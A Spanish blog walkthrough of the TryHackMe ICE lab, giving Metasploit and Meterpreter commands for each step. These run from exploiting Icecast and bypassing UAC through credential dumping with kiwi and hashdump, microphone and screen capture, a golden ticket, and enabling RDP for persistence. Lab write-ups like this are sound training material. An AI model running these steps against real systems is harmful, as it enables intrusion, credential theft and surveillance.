---
title: "TryHackMe ICE: explotación y post-explotación"
description: "Walkthrough de la máquina ICE de TryHackMe con Nmap, Metasploit y post-explotación en Windows."
date: "2026-05-27"
published: true
tags:
  - tryhackme
  - pentesting
  - metasploit
  - post-explotación
  - windows
readTime: "7 min"
---

# TryHackMe ICE: explotación y post-explotación

En este post cuento un flujo rápido para comprometer la máquina `ICE` de TryHackMe. El objetivo fue ir desde el reconocimiento inicial hasta obtener privilegios de SYSTEM y ejecutar módulos de post-explotación.

## 1. Preparación

Primero aseguré la resolución del nombre en mi entorno local, editando `/etc/hosts` para que el nombre de la máquina apunte a la IP objetivo.

```bash
nano /etc/hosts

# Añadir algo como:
# 10.10.10.123 ice.tryhackme
```

Esto facilita ejecutar algunos escaneos o conexiones si el reto requiere nombre de host.

## 2. Reconocimiento con Nmap

Usé Nmap con scripts, detección de versiones y una tasa de envío alta para obtener resultados rápidos.

```bash
nmap -sCV -T5 --min-rate 95000 <IP>
```

El hallazgo principal fue un servicio HTTP vulnerable con un encabezado `IceCast` o `icecast_header`.

## 3. Explotación con Metasploit

Arranqué Metasploit y cargué el exploit identificado.

```bash
msfconsole

use exploit/windows/http/icecast_header
set RHOSTS <IP>
set LHOST <mi_ip>
run
```

Una vez explotado, confirmé el acceso con los comandos básicos de Meterpreter.

```bash
getuid
sysinfo
```

## 4. Enumeración local

Para identificar vectores de escalada de privilegios, ejecuté el sugeridor automático de exploits locales.

```bash
run post/multi/recon/local_exploit_suggester
```

El reporte devolvió un exploit válido para bypass UAC usando `eventvwr`.

## 5. Manejo de la sesión

Puse la sesión en segundo plano para cambiar a la explotación local.

```bash
background
```

Luego cargué el módulo local y revisé sus opciones.

```bash
use exploit/windows/local/bypassuac_eventvwr
options
set LHOST <mi_ip>
run
```

## 6. Obtener privilegios más altos

Con la explotación local, verifiqué privilegios y procesos.

```bash
getprivs
ps
```

A continuación migré a un proceso estable para mantener sesión.

```bash
migrate <PID>
getuid
```

## 7. Cargar `kiwi` y extraer credenciales

Ya con una sesión estable, cargué el módulo `kiwi` para acceder a hashes y credenciales.

```bash
load kiwi
help
creds_all
```

También revisé algunos comandos útiles de Meterpreter.

```bash
help
hashdump
```

## 8. Opciones adicionales de post-explotación

Exploré capacidades adicionales que se pueden usar en un entorno comprometido.

```bash
screenshare
record_mic
```

La máquina ICE es ideal para practicar técnicas de persistencia y movimiento lateral, aunque en este walkthrough el foco fue la escalada local y la extracción de credenciales.

## 9. Crear ticket dorado (teórico)

Una de las capacidades avanzadas en un host Windows es la posibilidad de crear un Golden Ticket si tenemos acceso a credenciales Kerberos o `krbtgt`.

```bash
golden_ticket_create
```

Este paso no siempre es posible en todos los escenarios, pero es un buen recordatorio de lo que se puede hacer desde un host de dominio comprometido.

## 10. Habilitar RDP

Una vez dentro, habilité el acceso remoto para mantener un acceso persistente o facilitar un segundo punto de entrada.

```bash
run post/windows/manage/enable_rdp
```

## Conclusión

ICE es una máquina que permite practicar varios pasos del flujo de ataque: reconocimiento rápido, explotación HTTP con Metasploit, bypass de UAC local y post-explotación con Meterpreter. El uso de `local_exploit_suggester` y `kiwi` demuestran cómo pasar de una shell inicial a un control más profundo del sistema Windows.

> Nota: siempre realiza este tipo de pruebas en entornos autorizados y con objetivos de laboratorio como TryHackMe.
